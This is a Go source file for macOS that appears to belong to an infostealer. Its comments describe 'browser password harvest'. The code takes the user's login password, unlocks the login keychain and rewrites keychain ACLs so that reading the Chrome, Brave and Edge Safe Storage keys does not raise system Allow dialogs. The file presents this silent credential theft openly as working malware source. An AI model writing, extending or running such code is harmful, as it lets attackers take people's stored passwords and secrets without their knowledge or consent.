//go:build darwin

// keychain_unlock_darwin.go — unlock the login keychain with the Mac user password,
// then apply silent ACL (set-key-partition-list) for browser password harvest.
//
// Flow (EnsureLoginKeychainUnlocked):
//  1. Require macLoginPassword (from app confirmation modal / -mac-password / env).
//  2. unlock-keychain -p when locked (also refresh when already unlocked).
//  3. set-key-partition-list so find-generic-password does not open system Allow dialogs.
//  4. Mark session ready for browser decrypt + dump-keychain.
//
// App confirmation modal = OK. System Keychain password/Allow modals = suppressed for harvest.
// Callers must obtain a real login password first (main → acquireMacPassword).
package crypto

import (
	"fmt"
	"os/exec"
	"strings"
	"sync"
)

var (
	macLoginPassword  string
	keychainOnce      sync.Once
	keychainUnlocked  bool
	keychainUnlockErr error
	// keychainWasLocked records whether we had to unlock (for logs/summary).
	keychainWasLocked bool
)

// SetMacLoginPassword stores the macOS user/login password for unlock + silent reads.
func SetMacLoginPassword(password string) {
	macLoginPassword = strings.TrimSpace(password)
}

// MacLoginPassword returns the configured macOS login password, if any.
func MacLoginPassword() string {
	return macLoginPassword
}

// TryUnlockLoginKeychain validates the login password, then unlocks the keychain if locked.
func TryUnlockLoginKeychain(password string) error {
	if err := ValidateMacLoginPassword(password); err != nil {
		return err
	}
	SetMacLoginPassword(password)
	return EnsureLoginKeychainUnlocked()
}

// EnsureLoginKeychainUnlocked unlocks the login keychain when locked using the
// stored user password, or no-ops unlock if it is already unlocked.
func EnsureLoginKeychainUnlocked() error {
	keychainOnce.Do(func() {
		if macLoginPassword == "" {
			keychainUnlockErr = fmt.Errorf("mac login password not set")
			return
		}
		loginKC := loginKeychainPath()
		if loginKC == "" {
			keychainUnlockErr = fmt.Errorf("login keychain path not found")
			return
		}

		locked := IsLoginKeychainLocked(loginKC)
		keychainWasLocked = locked
		if locked {
			logf("login keychain is locked — unlocking with user password")
			if err := unlockLoginKeychain(macLoginPassword, loginKC); err != nil {
				keychainUnlockErr = err
				logf("unlock-keychain failed: %v", err)
				return
			}
			logf("login keychain unlocked successfully")
		} else {
			// Still run unlock with -p when possible — keeps session usable for security(1).
			if err := unlockLoginKeychain(macLoginPassword, loginKC); err != nil {
				logf("unlock-keychain (already unlocked path) note: %v", err)
			} else {
				logf("login keychain already unlocked — refresh unlock with user password")
			}
		}

		configureSilentKeychainAccess(loginKC)

		// Rewrite item ACLs so find-generic-password does not open system Allow dialogs
		// when harvesting Chrome/Brave/Edge Safe Storage (and other genp items).
		applySilentKeyPartitionList(loginKC, macLoginPassword)

		// Verify we can read keychain info after unlock / existing session.
		if IsLoginKeychainLocked(loginKC) {
			keychainUnlockErr = fmt.Errorf("login keychain still locked after unlock attempt")
			return
		}
		keychainUnlocked = true
	})
	return keychainUnlockErr
}

// LoginKeychainUnlocked reports whether the keychain session is ready for harvest.
func LoginKeychainUnlocked() bool {
	return keychainUnlocked
}

// LoginKeychainWasLocked reports whether unlock-keychain was required this run.
func LoginKeychainWasLocked() bool {
	return keychainWasLocked
}

// IsLoginKeychainLocked returns true if security(1) reports the keychain as locked
// or show-keychain-info fails in a way that implies it is not usable.
func IsLoginKeychainLocked(loginKC string) bool {
	if loginKC == "" {
		loginKC = loginKeychainPath()
	}
	if loginKC == "" {
		return true
	}
	cmd := exec.Command("security", "show-keychain-info", loginKC)
	out, err := cmd.CombinedOutput()
	if err == nil {
		return false
	}
	msg := strings.ToLower(string(out) + " " + err.Error())
	// Explicit locked state, or any failure treating as locked so we attempt unlock.
	if strings.Contains(msg, "locked") ||
		strings.Contains(msg, "could not find") ||
		strings.Contains(msg, "unable to") ||
		strings.Contains(msg, "sec") {
		return true
	}
	return true
}

// unlockLoginKeychain runs: security unlock-keychain -p <password> <keychain>
func unlockLoginKeychain(password, loginKC string) error {
	if password == "" || loginKC == "" {
		return fmt.Errorf("password and keychain path required")
	}
	// -p must be passed only to unlock-keychain (not find-generic-password).
	cmd := exec.Command("security", "unlock-keychain", "-p", password, loginKC)
	out, err := cmd.CombinedOutput()
	if err != nil {
		msg := strings.TrimSpace(string(out))
		if msg == "" {
			msg = err.Error()
		}
		return fmt.Errorf("unlock-keychain failed: %s", msg)
	}
	return nil
}
